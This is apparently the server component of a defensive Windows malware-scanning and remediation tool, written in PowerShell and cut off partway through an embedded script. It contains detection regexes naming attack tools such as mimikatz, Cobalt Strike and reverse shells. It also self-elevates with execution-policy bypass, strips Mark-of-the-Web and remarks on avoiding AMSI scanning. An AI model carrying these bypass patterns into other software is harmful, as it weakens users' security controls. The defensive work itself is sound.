#Requires -Version 5.1
<#
.SYNOPSIS
    ZeroBreach V23 "Kraken Console" — Pure PowerShell HTTP Server
    No Python required. Self-hosted GUI via System.Net.HttpListener + SSE.
.DESCRIPTION
    Starts a local HTTP listener, serves the cyberpunk frontend, and bridges to
    ZeroBreach-V23.ps1 scan engine in real-time via Server-Sent Events (SSE).
    Admin elevation is handled automatically.
.PARAMETER Port
    HTTP port (default 0 = auto-find free port)
.PARAMETER NoBrowser
    Skip auto-opening the browser
#>
[CmdletBinding()]
param(
    [int]$Port      = 0,
    [switch]$NoBrowser
)

Set-StrictMode -Off
$ErrorActionPreference = 'SilentlyContinue'

# ── Self-elevation ──────────────────────────────────────────────────────────────
$me = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
if (-not $me.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host '[ZeroBreach] Requesting elevation...' -ForegroundColor Cyan
    $argStr = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    if ($Port -gt 0) { $argStr += " -Port $Port" }
    if ($NoBrowser)  { $argStr += " -NoBrowser" }
    Start-Process powershell $argStr -Verb RunAs
    exit
}

# ── Paths ──────────────────────────────────────────────────────────────────────
# Keep the script dir as CWD even after UAC elevation (elevation can drop to System32).
Set-Location -LiteralPath $PSScriptRoot
$script:ROOT      = $PSScriptRoot

# ── Portability: strip Mark-of-the-Web ─────────────────────────────────────────
# A downloaded/transferred copy carries Zone.Identifier ADS on every extracted file.
# -ExecutionPolicy Bypass covers our own scripts, but unblock the runtime tree anyway
# so nothing downstream (engine spawn, data loads, browser-served assets) can trip on
# zone marks on a foreign box. Runtime files only — reports/ and dev folders skipped.
try {
    Get-ChildItem -LiteralPath $script:ROOT -File -ErrorAction SilentlyContinue |
        Where-Object { $_.Extension -in '.ps1','.bat','.md' } | Unblock-File -ErrorAction SilentlyContinue
    foreach ($sub in @('engine', 'gui', 'data')) {
        $dir = Join-Path $script:ROOT $sub
        if (Test-Path $dir) {
            Get-ChildItem -LiteralPath $dir -Recurse -File -ErrorAction SilentlyContinue |
                Where-Object { $_.Extension -in '.ps1','.js','.css','.html','.json' } |
                Unblock-File -ErrorAction SilentlyContinue
        }
    }
} catch {}
$script:SCAN_PS   = Join-Path $ROOT 'ZeroBreach-V23.ps1'
$script:GUI_DIR   = Join-Path $ROOT 'gui'
$script:REPORTS   = Join-Path $ROOT 'reports'
if (-not (Test-Path $script:REPORTS)) {
    try {
        New-Item -ItemType Directory -Path $script:REPORTS -Force -ErrorAction Stop | Out-Null
    } catch {
        Write-Host ('[ZeroBreach] FATAL: cannot create reports folder at ' + $script:REPORTS) -ForegroundColor Red
        Write-Host ('             ' + $_.Exception.Message) -ForegroundColor Red
        Write-Host '             The drive may be read-only or ejected. Copy ZeroBreach to a writable location.' -ForegroundColor Yellow
        exit 1
    }
}

# ── Durable logging ─────────────────────────────────────────────────────────────
# Post-run validation needs more than the (ephemeral) browser/console. Two files in reports\:
#   • server_console_*.log — main-thread server console (banners, listener/request errors),
#     captured via Start-Transcript; Stop-Transcript runs in the accept-loop finally.
#   • server_events_*.log  — the FULL SSE event stream (every log_line, finding, [FIX] line,
#     and the remediation_complete applied/failed/skipped/blocked summary), teed to disk by
#     Enqueue/REnqueue inside the scan + remediation runspaces (their output never hits the
#     console — it only flows to the in-memory EventLog → SSE → browser, so a transcript alone
#     would miss it). Path is carried on $script:State.EventLogFile so both runspaces can reach it.
$script:LOG_STAMP   = Get-Date -Format 'yyyyMMdd_HHmmss'
$script:EVENT_LOG   = Join-Path $script:REPORTS ('server_events_{0}.log'  -f $script:LOG_STAMP)
$script:CONSOLE_LOG = Join-Path $script:REPORTS ('server_console_{0}.log' -f $script:LOG_STAMP)
try { Start-Transcript -LiteralPath $script:CONSOLE_LOG -Force -ErrorAction Stop | Out-Null } catch {}

# ── MITRE ATT&CK map (loaded once; injected into the scan runspace for tagging) ─
# data/*.json is NOT AMSI-scanned, so this is safe to load at runtime.
$script:MITRE_MAP = $null
$mitrePath = Join-Path $ROOT 'data\mitre_mapping.json'
if (Test-Path $mitrePath) {
    try { $script:MITRE_MAP = Get-Content -LiteralPath $mitrePath -Raw -ErrorAction Stop | ConvertFrom-Json }
    catch { $script:MITRE_MAP = $null }
}

# ── Built-in scan profiles (read-only presets served by /api/profiles) ─────────
# Deliberately NO ioc_file key: applying a builtin must not blank an IOC path the
# IOC Manager just set (the GUI only writes fields present on the profile).
$script:PROFILE_BUILTINS = @(
    [pscustomobject]@{ name='Triage (QUICK, 24h)';        mode='QUICK';   hours=24; html_report=$true;  snapshot=$true; baseline=$false; paranoid=$false; csv=$false; stealth=$false; builtin=$true },
    [pscustomobject]@{ name='Standard (FULL, all time)';  mode='FULL';    hours=0;  html_report=$true;  snapshot=$true; baseline=$false; paranoid=$false; csv=$false; stealth=$false; builtin=$true },
    [pscustomobject]@{ name='Incident (DEEP, all time)';  mode='DEEP';    hours=0;  html_report=$true;  snapshot=$true; baseline=$false; paranoid=$false; csv=$false; stealth=$false; builtin=$true },
    [pscustomobject]@{ name='Silent (STEALTH, all time)'; mode='STEALTH'; hours=0;  html_report=$false; snapshot=$true; baseline=$false; paranoid=$false; csv=$false; stealth=$true;  builtin=$true }
)

# ── Shared State (synchronized — accessed by multiple runspaces) ───────────────
$script:State = [hashtable]::Synchronized(@{
    Running      = $false
    ScanComplete = $false
    Phase        = 0
    PhaseIdx     = 0      # count of distinct PHASE headers seen this scan; QUICK's display counter
    PhaseTotal   = 115
    PhaseName    = ''
    Section      = ''
    Mode         = 'FULL'
    Elapsed      = 0
    StartTime    = [datetime]::MinValue
    LineCount    = 0
    ResultsPath  = ''
    SnapshotRequested = $true   # "Create Rollback Snapshot" (default on, mirrors the GUI checkbox):
                                # the remediation runspace exports a .reg rollback before applying fixes
    SnapshotPath = ''
    Listening    = $true
    EventLogFile = $script:EVENT_LOG   # durable tee of the SSE event stream (set above); read by Enqueue/REnqueue
    ScanEpoch    = 0      # bumped each time EventLog is cleared for a new scan; SSE clients rewind on change
    Process      = $null
    EngineReport = ''     # filename of the engine's rich KrakenBaseline_*.json from the last scan
    Remediating  = $false
    EventLog     = [System.Collections.ArrayList]::Synchronized(
                       [System.Collections.ArrayList]::new())
    Findings     = [System.Collections.ArrayList]::Synchronized(
                       [System.Collections.ArrayList]::new())
    ThreatCounts = [hashtable]::Synchronized(@{
        RAT=0; Rootkit=0; Ransomware=0; Keylogger=0; Worm=0
        Miner=0; Trojan=0; Spyware=0; Fileless=0; Other=0
    })
})

# ── MIME types ─────────────────────────────────────────────────────────────────
$script:MIME = @{
    '.html' = 'text/html; charset=utf-8'
    '.css'  = 'text/css; charset=utf-8'
    '.js'   = 'application/javascript; charset=utf-8'
    '.json' = 'application/json; charset=utf-8'
    '.ico'  = 'image/x-icon'
    '.png'  = 'image/png'
    '.svg'  = 'image/svg+xml'
    '.woff2'= 'font/woff2'
    '.woff' = 'font/woff'
    '.ttf'  = 'font/ttf'
}

# NOTE (2026-07-22 review #45): $script:SEV_PATTERNS and $script:PHASE_RE used to live here and
# were dead — a runspace cannot share script scope with its parent, so the scan runspace embeds
# its OWN copies (see $script:SCAN_SCRIPT's $SEV_RX / phase regex, which are the live ones).
# $PHASE_RE here was additionally a stale NON-fractional 'PHASE\s+(\d+)' that would have misled
# an editor into "fixing" the runspace copy to match it and silently dropping phases 55.5/74.5/99.5.
# Removed rather than kept as documentation. Edit the copies inside $script:SCAN_SCRIPT.

# ── CSRF / origin hardening (2026-07-22 review #2) ─────────────────────────────
# This server binds to loopback, but "loopback" is NOT "only the GUI can reach it": every
# page in the operator's browser can reach it too. With the old `Access-Control-Allow-Origin: *`
# plus a permissive OPTIONS preflight, any site the operator had open — a malicious ad, a
# compromised vendor page — could POST /api/remediate and drive real destructive remediation
# (file deletes, registry deletes, process kills) on the machine being audited, bypassing the
# typed-PURGE modal that is the load-bearing safety gate for destructive actions.
#
# Two independent locks, both enforced on every state-changing (POST) route:
#   1. Origin/Referer must be this server's own address. A browser ALWAYS sends Origin on a
#      cross-origin POST, so a malicious page cannot omit it to slip past.
#   2. A per-process random token must be echoed in X-ZB-Token. The token is only readable
#      same-origin (GET /api/csrf, and no ACAO header is sent any more), so a cross-origin
#      page cannot learn it even if it could reach the route.
# A request carrying NEITHER Origin NOR Referer is treated as a non-browser client (curl,
# Invoke-WebRequest, the headless test harness) and is allowed without a token — that path is
# unreachable from a web page, which is what the locks exist to stop.
$script:CSRF_TOKEN = [Convert]::ToBase64String([Guid]::NewGuid().ToByteArray() + [Guid]::NewGuid().ToByteArray()).TrimEnd('=')
$script:ALLOWED_ORIGINS = @()   # populated once the port is known (see listener setup)

function Test-RequestAllowed {
    # Returns $null when the request may proceed, or a reason string to reject with 403.
    param($Req)
    $origin  = "$($Req.Headers['Origin'])"
    $referer = "$($Req.Headers['Referer'])"
    if (-not $origin -and -not $referer) { return $null }   # non-browser client
    if ($origin) {
        if ($script:ALLOWED_ORIGINS -notcontains $origin.TrimEnd('/')) { return "cross-origin request rejected (Origin: $origin)" }
    } elseif ($referer) {
        $refOk = $false
        foreach ($ao in $script:ALLOWED_ORIGINS) { if ($referer.StartsWith("$ao/") -or $referer -eq $ao) { $refOk = $true; break } }
        if (-not $refOk) { return "cross-origin request rejected (Referer: $referer)" }
    }
    # Same-origin browser request: the token must match too.
    $tok = "$($Req.Headers['X-ZB-Token'])"
    if ($tok -ne $script:CSRF_TOKEN) { return 'missing or invalid CSRF token' }
    return $null
}

# ── Helpers ────────────────────────────────────────────────────────────────────
function Get-FreePort {
    $l = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Loopback, 0)
    $l.Start()
    $p = $l.LocalEndpoint.Port
    $l.Stop()
    return $p
}

function Write-JsonResponse {
    param($Ctx, [string]$Body, [int]$Code = 200)
    try {
        $r = $Ctx.Response
        $r.StatusCode    = $Code
        $r.ContentType   = 'application/json; charset=utf-8'
        # No Access-Control-Allow-Origin: the GUI is served from this same origin and needs
        # none, while sending '*' let any other page in the operator's browser read these
        # responses (and, with the old permissive preflight, drive /api/remediate).
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
        $r.ContentLength64 = $bytes.Length
        $r.OutputStream.Write($bytes, 0, $bytes.Length)
        $r.OutputStream.Close()
    } catch {}
}

function Send-StaticFile {
    param($Ctx, [string]$FilePath)
    if (-not (Test-Path $FilePath -PathType Leaf)) {
        Write-JsonResponse $Ctx '{"error":"not found"}' 404
        return
    }
    $ext  = [System.IO.Path]::GetExtension($FilePath).ToLower()
    $mime = $script:MIME[$ext]
    if (-not $mime) { $mime = 'application/octet-stream' }
    try {
        $r = $Ctx.Response
        $r.StatusCode  = 200
        $r.ContentType = $mime
        $bytes = [System.IO.File]::ReadAllBytes($FilePath)
        $r.ContentLength64 = $bytes.Length
        $r.OutputStream.Write($bytes, 0, $bytes.Length)
        $r.OutputStream.Close()
    } catch {}
}

function Write-DownloadResponse {
    param($Ctx, [string]$Body, [string]$ContentType, [string]$FileName)
    try {
        $r = $Ctx.Response
        $r.StatusCode  = 200
        $r.ContentType = $ContentType
        $r.Headers['Content-Disposition'] = "attachment; filename=`"$FileName`""
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
        $r.ContentLength64 = $bytes.Length
        $r.OutputStream.Write($bytes, 0, $bytes.Length)
        $r.OutputStream.Close()
    } catch {}
}

# Build a self-contained HTML report from the current scan findings.
function Get-HtmlReport {
    $findings = @($script:State.Findings)
    $sevColor = @{ CRITICAL='#ff3838'; HIGH='#ff9500'; POSSIBLE='#ffd60a'; INFO='#6b7280'; CLEAN='#39ff9a' }
    $counts   = $script:State.ThreatCounts
    $total    = $findings.Count
    $sevRank  = @{ CRITICAL=0; HIGH=1; POSSIBLE=2; INFO=3; CLEAN=4 }
    $sorted   = $findings | Sort-Object @{ Expression = { $r = $sevRank["$($_.severity)"]; if ($null -ne $r) { $r } else { 9 } } }

    $rows = foreach ($f in $sorted) {
        $sev  = "$($f.severity)"
        $col  = $sevColor[$sev]; if (-not $col) { $col = '#6b7280' }
        $desc = [System.Net.WebUtility]::HtmlEncode("$($f.line)")
        $type = [System.Net.WebUtility]::HtmlEncode("$($f.threat_type)")
        $mitreCell = ''
        if ($f.mitre -and $f.mitre.id) {
            $mid = [System.Net.WebUtility]::HtmlEncode("$($f.mitre.id)")
            $mnm = [System.Net.WebUtility]::HtmlEncode("$($f.mitre.name)")
            $url = "$($f.mitre.url)"; if (-not $url) { $url = "https://attack.mitre.org/techniques/$($f.mitre.id -replace '\.','/')/" }
            $mitreCell = "<a href='$([System.Net.WebUtility]::HtmlEncode($url))' target='_blank' title='$mnm'>$mid</a>"
        }
        "<tr><td><span class='badge' style='background:$col'>$sev</span></td><td>PH$($f.phase)</td><td>$type</td><td>$mitreCell</td><td>$desc</td></tr>"
    }

    $tally = foreach ($k in @('RAT','Rootkit','Ransomware','Keylogger','Worm','Miner','Trojan','Spyware','Fileless','Other')) {
        $v = [int]$counts[$k]
        if ($v -gt 0) { "<span class='chip'>$k <b>$v</b></span>" }
    }

    $genAt = [datetime]::Now.ToString('yyyy-MM-dd HH:mm:ss')
    @"
<!doctype html><html><head><meta charset="utf-8"><title>ZeroBreach Report — $($env:COMPUTERNAME)</title>
<style>
body{background:#05080c;color:#cde3f0;font-family:"Segoe UI",system-ui,monospace;margin:0;padding:28px}
h1{color:#00d9ff;letter-spacing:3px;font-size:22px;margin:0 0 4px}
.meta{color:#7d97a8;font-size:12px;margin-bottom:18px}
.chips{margin:14px 0 22px}
.chip{display:inline-block;background:#0d1620;border:1px solid #1b2b3a;border-radius:14px;padding:4px 11px;margin:3px;font-size:12px;color:#9fc1d6}
.chip b{color:#00d9ff;margin-left:4px}
table{border-collapse:collapse;width:100%;font-size:12.5px}
th,td{border:1px solid #16222e;padding:7px 9px;text-align:left;vertical-align:top}
th{background:#0c1622;color:#6fb6d8;text-transform:uppercase;letter-spacing:1px;font-size:11px}
tr:nth-child(even){background:#080f16}
.badge{color:#03121a;font-weight:700;padding:2px 8px;border-radius:4px;font-size:11px}
a{color:#00d9ff;text-decoration:none}a:hover{text-decoration:underline}
.empty{color:#39ff9a;padding:30px;text-align:center}
</style></head><body>
<h1>◈ ZEROBREACH V23 — INCIDENT REPORT</h1>
<div class="meta">Host: $([System.Net.WebUtility]::HtmlEncode($env:COMPUTERNAME)) &nbsp;·&nbsp; Mode: $($script:State.Mode) &nbsp;·&nbsp; Findings: $total &nbsp;·&nbsp; Generated: $genAt</div>
<div class="chips">$($tally -join '')</div>
$(if ($total -gt 0) { "<table><tr><th>Severity</th><th>Phase</th><th>Threat</th><th>ATT&CK</th><th>Detail</th></tr>$($rows -join '')</table>" } else { "<div class='empty'>✓ NO FINDINGS — SYSTEM APPEARS CLEAN</div>" })
</body></html>
"@
}

function Get-CsvReport {
    $findings = @($script:State.Findings)
    $sb = [System.Text.StringBuilder]::new()
    [void]$sb.AppendLine('"Severity","Phase","ThreatType","ATTACK_ID","ATTACK_Name","Detail","Timestamp"')
    foreach ($f in $findings) {
        $mid = if ($f.mitre -and $f.mitre.id) { "$($f.mitre.id)" } else { '' }
        $mnm = if ($f.mitre -and $f.mitre.name) { "$($f.mitre.name)" } else { '' }
        $cells = @("$($f.severity)", "PH$($f.phase)", "$($f.threat_type)", $mid, $mnm, "$($f.line)", "$($f.timestamp)")
        # Neutralise CSV/formula injection. A finding's Detail carries attacker-chosen text
        # (filenames, registry values, command lines); a cell starting =, +, - or @ is executed
        # as a formula/DDE payload when the technician opens the export in Excel. Prefixing a
        # single quote is the standard defence and Excel hides it in the cell.
        $line = ($cells | ForEach-Object {
            $c = "$_"
            if ($c -match '^[=+\-@\t\r]') { $c = "'" + $c }
            '"' + ($c -replace '"','""') + '"'
        }) -join ','
        [void]$sb.AppendLine($line)
    }
    return $sb.ToString()
}

# Main-thread MITRE resolver (mirrors the runspace copy; uses $script:MITRE_MAP).
function Resolve-MitreMain {
    param([string]$Line, [string]$ThreatType, $Phase)
    $map = $script:MITRE_MAP
    if (-not $map) { return $null }
    $ll = "$Line".ToLower()
    $id = $null
    foreach ($p in $map.keyword_map.PSObject.Properties) {
        if ($p.Name -eq '_comment') { continue }
        if ($ll.Contains($p.Name)) { $id = [string]$p.Value; break }
    }
    if (-not $id -and $ThreatType) {
        $arr = $map.threat_type_map.$ThreatType
        if ($arr) { $id = [string]$arr[0] }
    }
    if (-not $id -and $Phase -gt 0) {
        # Mirror of the runspace Resolve-Mitre: exact (possibly fractional) phase key
        # first, then the integer phase's entry.
        $pe = $map.phase_map."PHASE $Phase"
        if (-not ($pe -and $pe.techniques)) { $pe = $map.phase_map."PHASE $([int][math]::Floor([double]$Phase))" }
        if ($pe -and $pe.techniques) { $id = [string]$pe.techniques[0] }
    }
    if (-not $id) { return $null }
    $t = $map.techniques.$id
    if (-not $t) { return @{ id = $id; name = $id; tactic = ''; url = '' } }
    $tactic = if ($t.tactics) { [string]$t.tactics[0] } else { '' }
    return @{ id = $id; name = $t.name; tactic = $tactic; url = $t.url }
}

# ── Trusted vendor (RMM partner) allowlist ──────────────────────────────────────
# Datto / CentraStage / Kaseya are legitimate managed-services partner tooling, NOT malware.
# Returns a reason if a finding is just this tooling doing its normal job, else ''. This is a
# *soft* signal (suppresses auto-selection + labels it; the operator can still act manually) —
# unlike Test-ProtectedTarget which is a hard block. Uses judgment: a vendor-named artifact in a
# suspicious location, or with an independent malicious signal, is NOT trusted (stays flagged).
function Test-VendorTrusted {
    param([string]$Action, [string]$Param, [string]$Target, [string]$Desc)
    $p = "$Param"; $hay = "$p`n$Target`n$Desc"
    if ($hay -notmatch '(?i)(centrastage|datto|kaseya|aemagent|cagservice|agentmon|kworking)') { return '' }
    # Vendor name in a user temp/download/cache location is suspicious for RMM — let it flag.
    if ($p -match '(?i)\\(Temp|Downloads|INetCache|Temporary Internet Files|Content\.Outlook)\\') { return '' }
    # Independent strong malicious signal overrides the trust (use judgment — flag if off).
    if ($hay -match '(?i)(known\s*malware|sha256 matches|matches known|masquerad|hollow|injected|mimikatz|cobalt\s*strike|reverse\s*shell|ransom|\blsass\b|keylog)') { return '' }
    return 'Datto/CentraStage/Kaseya RMM — trusted partner tooling'
}

# ── SAFETY: protected-resource guard ────────────────────────────────────────────
# Priority #1 — the tool must NEVER remediate (or even auto-select) anything that would
# damage the system. Returns a human reason if the fix would touch a protected resource,
# else ''. Deliberately conservative: a real threat in one of these locations is *audited*
# but never auto-acted-on (the operator handles it manually). Mirrored verbatim in the
# REMEDIATE_SCRIPT runspace below — keep both copies in sync.
function Test-ProtectedTarget {
    param([string]$Action, [string]$Param, [string]$Target, [string]$Desc)
    $p = "$Param"; $t = "$Target"; $d = "$Desc"
    $hay = "$p`n$t`n$d"

    # Certificate trust store — deleting root/CA certs breaks TLS / Windows Update / code-signing.
    if ($p -match '(?i)Cert:\\' -or $hay -match '(?i)(root\s+ca|trusted\s+root|certificate\s+(store|authority))') {
        return 'certificate trust store (deleting breaks HTTPS / code-signing)'
    }
    # Windows / system directories and shell/system files.
    if ($p -match '(?i)^[a-z]:\\windows\\' -or $p -match '(?i)\\(System32|SysWOW64|WinSxS)\\') {
        return 'Windows system directory'
    }
    if ($p -match '(?i)\\(desktop\.ini|iconcache\.db|thumbs\.db|ntuser\.dat|usrclass\.dat)' -or $p -match '(?i)\.library-ms$') {
        return 'Windows shell/system file'
    }
    # User shell / git / ssh / cloud config (dotfiles in the profile, or known config dirs).
    if ($p -match '(?i)\\Users\\[^\\]+\\\.[^\\]+$' -or
        $p -match '(?i)\\\.(ssh|gnupg|aws|azure|kube|docker|config)\\' -or
        $p -match '(?i)\\\.(bashrc|bash_profile|bash_history|profile|zshrc|gitconfig|npmrc|claude\.json)($|[^a-z])' -or
        $p -match '(?i)\\\.claude\\') {
        return 'user shell/git/ssh/cloud config (dotfile)'
    }
    # SafeBoot registry — deleting it breaks Safe Mode boot.
    if ($p -match '(?i)\\SafeBoot') { return 'SafeBoot registry (deleting breaks Safe Mode)' }
    # Core OS registry hives.
    if ($Action -match '(?i)DeleteReg' -and $p -match '(?i)\\(SYSTEM\\CurrentControlSet\\(Services|Control)|Microsoft\\Windows NT\\CurrentVersion\\(Winlogon|Image File Execution Options|SystemRestore)|Cryptography)') {
        return 'core OS registry'
    }
    # Critical processes / the IR tool itself (KillProcess). FixParam is a PID, so match the name in the description.
    if ($Action -eq 'KillProcess' -and $d -match '(?i)(\b(System|smss|csrss|wininit|winlogon|services|lsass|svchost|dwm|fontdrvhost|explorer|powershell|pwsh|conhost|RuntimeBroker|MsMpEng)\b|claude|zerobreach)') {
        return 'critical system process or the IR tool itself'
    }
    return ''
}

# Load the engine's rich report and normalize its findings to the frontend shape,
# enriching each with a MITRE tag. Carries FixAction/FixParam so the GUI can remediate.
# Findings touching a protected resource are tagged so the UI won't auto-select them and
# the remediation runspace will hard-block them.
function Get-EngineReportFindings {
    param([string]$ReportPath)
    $out = [System.Collections.ArrayList]::new()
    try {
        $report = (Get-Content -LiteralPath $ReportPath -Raw) | ConvertFrom-Json
    } catch { return @() }
    $i = 0
    foreach ($f in @($report.Findings)) {
        $sev = "$($f.Severity)".ToUpper()
        $tt  = "$($f.ThreatType)"; if (-not $tt) { $tt = $null }
        $phNum = 0; $pm = [regex]::Match("$($f.Phase)", '\d+(?:\.\d+)?'); if ($pm.Success) { $phNum = if ($pm.Value.Contains('.')) { [double]$pm.Value } else { [int]$pm.Value } }
        $line = if ($f.Target) { "$($f.Description) -> $($f.Target)" } else { "$($f.Description)" }
        $mit  = Resolve-MitreMain $line $tt $phNum
        $prot = Test-ProtectedTarget "$($f.FixAction)" "$($f.FixParam)" "$($f.Target)" "$($f.Description)"
        $vend = Test-VendorTrusted   "$($f.FixAction)" "$($f.FixParam)" "$($f.Target)" "$($f.Description)"
        [void]$out.Add([ordered]@{
            id               = "$($f.ID)"
            line             = $line
            severity         = $sev
            threat_type      = $tt
            phase            = $phNum
            group            = "$($f.Group)"
            fix_action       = "$($f.FixAction)"
            fix_param        = "$($f.FixParam)"
            protected        = [bool]$prot
            protected_reason = $prot
            vendor_trusted   = [bool]$vend
            vendor_reason    = $vend
            mitre            = $mit
            mitre_id         = if ($mit) { $mit.id } else { $null }
            timestamp        = "$($f.Timestamp)"
        })
        $i++
    }
    return @($out)
}

function Read-RequestBody {
    param($Ctx)
    try {
        $sr = [System.IO.StreamReader]::new(
            $Ctx.Request.InputStream, [System.Text.Encoding]::UTF8)
        return $sr.ReadToEnd()
    } catch { return '{}' }
}

function Read-JsonBody {
    # Parse a POST body, $null on bad JSON. The statement try/catch is load-bearing:
    # on PS 5.1 ConvertFrom-Json throws a TERMINATING error on malformed JSON that
    # -ErrorAction SilentlyContinue does NOT suppress — inline, that aborts the route
    # with no response and the client hangs. Never replace callers with the raw form.
    # NB: consumes the request InputStream — callable once per request.
    param($Ctx)
    try { return ((Read-RequestBody $Ctx) | ConvertFrom-Json -ErrorAction Stop) } catch { return $null }
}

function ConvertTo-Flag {
    # Strict boolean coercion for JSON-sourced flags. [bool]'false' is $true in
    # PowerShell (any non-empty string), so API clients sending string booleans
    # would silently enable stealth/paranoid flags without this.
    param($v)
    if ($v -is [bool]) { return $v }
    return ("$v" -match '^(?i)(true|1|yes)$')
}

function Write-Utf8Json {
    # UTF-8 WITHOUT BOM — raw ConvertFrom-Json readers and the engine's file
    # parsers choke on a BOM'd data file (Set-Content -Encoding UTF8 adds one on 5.1).
    param([string]$Path, $Obj, [int]$Depth = 4)
    $u8 = New-Object System.Text.UTF8Encoding($false)
    [System.IO.File]::WriteAllText($Path, ($Obj | ConvertTo-Json -Depth $Depth), $u8)
}

function Get-SysInfoJson {
    try {
        $cpuObj = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue
        $cpu    = if ($cpuObj) {
            ($cpuObj | Measure-Object LoadPercentage -Average).Average
        } else { 0 }

        $osObj  = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
        $ramPct = if ($osObj -and $osObj.TotalVisibleMemorySize -gt 0) {
            [math]::Round(
                ($osObj.TotalVisibleMemorySize - $osObj.FreePhysicalMemory) /
                $osObj.TotalVisibleMemorySize * 100, 1)
        } else { 0 }

        $defender = (Get-MpComputerStatus -ErrorAction SilentlyContinue).AntivirusEnabled

        return [ordered]@{
            hostname  = $env:COMPUTERNAME
            username  = $env:USERNAME
            os        = if ($osObj) { $osObj.Caption } else { 'Windows' }
            cpu       = [math]::Round([double]($cpu), 1)
            ram_used  = $ramPct
            defender  = [bool]$defender
            reports_dir = $script:REPORTS   # Settings shows the real output path (review #32)
        } | ConvertTo-Json -Compress
    } catch {
        return '{"error":"sysinfo unavailable"}'
    }
}

# ── Background runspace launcher ────────────────────────────────────────────────
# Every call site discards the handle, and nothing ever disposed the PowerShell/Runspace pair,
# so a long IR session (each SSE reconnect spawns one, each scan another) steadily leaked
# threads and handles. Track the live ones and reap the finished ones on each launch — an
# async completion callback would be tidier but cannot run in a runspace we are about to
# dispose, and this server never has more than a handful in flight.
$script:LiveRunspaces = [System.Collections.ArrayList]::new()

function Clear-FinishedRunspaces {
    for ($i = $script:LiveRunspaces.Count - 1; $i -ge 0; $i--) {
        $e = $script:LiveRunspaces[$i]
        try {
            if ($e.Handle.IsCompleted) {
                try { [void]$e.Ps.EndInvoke($e.Handle) } catch {}
                try { $e.Ps.Dispose() } catch {}
                try { $e.Rs.Close(); $e.Rs.Dispose() } catch {}
                $script:LiveRunspaces.RemoveAt($i)
            }
        } catch { $script:LiveRunspaces.RemoveAt($i) }
    }
}

function Start-Runspace {
    param([string]$Script, [hashtable]$Vars = @{})
    Clear-FinishedRunspaces
    $rs = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
    $rs.Open()
    foreach ($k in $Vars.Keys) {
        $rs.SessionStateProxy.SetVariable($k, $Vars[$k])
    }
    $ps = [System.Management.Automation.PowerShell]::Create()
    $ps.Runspace = $rs
    [void]$ps.AddScript($Script)
    $handle = $ps.BeginInvoke()
    [void]$script:LiveRunspaces.Add([pscustomobject]@{ Ps = $ps; Rs = $rs; Handle = $handle })
    return $ps
}

# ── SSE Stream Script (self-contained, runs in its own runspace) ───────────────
# Variables injected: $SseState (SharedState hashtable), $SseCtx (HttpListenerContext)
$script:SSE_SCRIPT = @'
$response = $SseCtx.Response
$response.StatusCode = 200
$response.ContentType = 'text/event-stream; charset=utf-8'
$response.Headers['Cache-Control']       = 'no-cache, no-store'
$response.Headers['X-Accel-Buffering']   = 'no'
# No ACAO: the event stream carries live finding data, and '*' let any other page in the
# operator's browser subscribe to it cross-origin. The GUI is same-origin and needs none.
$response.Headers['Connection']          = 'keep-alive'
$response.SendChunked = $true

$enc    = [System.Text.Encoding]::UTF8
$stream = $response.OutputStream

function Push {
    param([string]$Data)
    $bytes = $enc.GetBytes("data: $Data`n`n")
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Flush()
}

function Ping {
    $bytes = $enc.GetBytes(": ka`n`n")
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Flush()
}

# Send initial sync so page-reload during a scan gets full state.
# QUICK runs a non-contiguous 30-phase subset (raw numbers reach 75), so the GUI
# counter gets the 1..30 progress INDEX there; every other mode reports the raw phase.
$syncPhase = if ($SseState.Mode -eq 'QUICK') { $SseState.PhaseIdx } else { $SseState.Phase }
$syncObj = [ordered]@{
    type          = 'sync'
    running       = $SseState.Running
    scan_complete = $SseState.ScanComplete
    phase         = $syncPhase
    phase_total   = $SseState.PhaseTotal
    phase_name    = $SseState.PhaseName
    elapsed       = $SseState.Elapsed
    threat_counts = $SseState.ThreatCounts
    findings_count = $SseState.Findings.Count
}
Push ($syncObj | ConvertTo-Json -Compress -Depth 3)

$idx   = 0
$epoch = $SseState.ScanEpoch
$last  = [datetime]::Now

try {
    while ($SseState.Listening) {
        # A new scan clears EventLog and bumps ScanEpoch. Rewinding on the epoch
        # change (rather than on count comparison) is robust regardless of how fast
        # the new scan refills the log — the old count-compare guard could miss the
        # boundary where the refilled count momentarily equalled the stale cursor and
        # silently drop the new scan's first events for an already-open tab.
        if ($SseState.ScanEpoch -ne $epoch) { $idx = 0; $epoch = $SseState.ScanEpoch }
        $count = $SseState.EventLog.Count
        if ($idx -gt $count) { $idx = 0 }   # extra safety: cursor past end (shouldn't happen)
        while ($idx -lt $count) {
            Push $SseState.EventLog[$idx]
            $idx++
        }
        if (([datetime]::Now - $last).TotalSeconds -gt 20) {
            Ping
            $last = [datetime]::Now
        }
        Start-Sleep -Milliseconds 40
    }
} catch {
    # client disconnected — normal exit
} finally {
    try { $stream.Close() }    catch {}
    try { $response.Close() }  catch {}
}
'@

# ── Scan Engine Script (self-contained, runs in its own runspace) ──────────────
# Variables injected: $ScanState, $ScanConfig (hashtable), $ScanPsPath, $ScanReports
$script:SCAN_SCRIPT = @'
# ── Inline classification (can't reference main-script functions from runspace) ─
# NOTE: named $SEV_RX, not $SEV — PowerShell variables are case-insensitive, so a
# dict named $SEV is SHADOWED inside Classify by its local `$sev = 'INFO'`, making
# $SEV.Keys read the string 'INFO' (→ $null) and every line classify as INFO. This
# exact bug shipped and silently killed severity classification for weeks.
$SEV_RX = [ordered]@{
    CRITICAL = [regex]'\[CRIT\]|CRITICAL|\[!!\]|THREAT BANNER|IOC HIT|BLATANT'
    HIGH     = [regex]'\[HIGH\]|HIGH SEVERITY|\[WARN\]|SUSPICIOUS'
    POSSIBLE = [regex]'\[POSSIBLE\]|POSSIBLE|FLAGGED|ANOMAL'
    CLEAN    = [regex]'\[OK\s*\]|CLEAN|NO .* FOUND|->\s*\[OK\s*\]'
